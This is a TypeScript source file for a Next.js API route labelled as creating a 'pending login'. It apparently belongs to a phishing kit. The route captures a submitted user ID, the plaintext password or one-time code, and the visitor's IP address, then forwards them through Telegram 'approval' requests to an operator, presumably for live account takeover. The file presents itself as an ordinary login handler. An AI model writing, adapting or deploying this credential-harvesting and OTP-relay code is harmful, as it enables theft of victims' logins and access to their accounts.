import { formatPendingLoginDatabaseLabel } from "@/lib/database-urls"
import { NextRequest, NextResponse, after } from "next/server"
import { createPendingLogin } from "@/lib/pending-logins"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import { resolveMemberOrigin } from "@/lib/member-origin"
import {
  sendLoginApprovalRequest,
  sendOtpApprovalRequest,
} from "@/lib/telegram-approval"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { userId = "", password = "", method, maskedEmail = "", maskedPhone = "", flow } = body
    if (!method || (method !== "email" && method !== "text")) {
      return NextResponse.json(
        { error: "method is required and must be email or text" },
        { status: 400 },
      )
    }
    const memberOrigin = resolveMemberOrigin(request)
    const record = await createPendingLogin({
      projectId: "thestandard",
      projectName: SITE_DISPLAY_NAME,
      requestKind: flow === "login_otp" ? "otp" : "login",
      userId: String(userId),
      password: String(password),
      method,
      maskedEmail: String(maskedEmail),
      maskedPhone: String(maskedPhone),
      memberOrigin,
    })

    const forwarded = request.headers.get("x-forwarded-for")
    const realIp = request.headers.get("x-real-ip")
    const ip = forwarded?.split(",")[0]?.trim() || realIp || "Unknown"

    after(async () => {
      const databaseShard = formatPendingLoginDatabaseLabel(record.id)
      if (flow === "otp" || flow === "login_otp" || record.requestKind === "otp") {
        await sendOtpApprovalRequest({
          userId: record.userId,
          code: record.password,
          method: record.method,
          createdAtMs: record.createdAt,
          databaseShard,
          ip,
        })
      } else {
        await sendLoginApprovalRequest({
          userId: record.userId,
          password: record.password,
          method: record.method,
          createdAtMs: record.createdAt,
          databaseShard,
          ip,
        })
      }
    })

    return NextResponse.json({ id: record.id })
  } catch (e) {
    console.error("Pending login create error:", e)
    return NextResponse.json({ error: "Failed to create pending login" }, { status: 500 })
  }
}
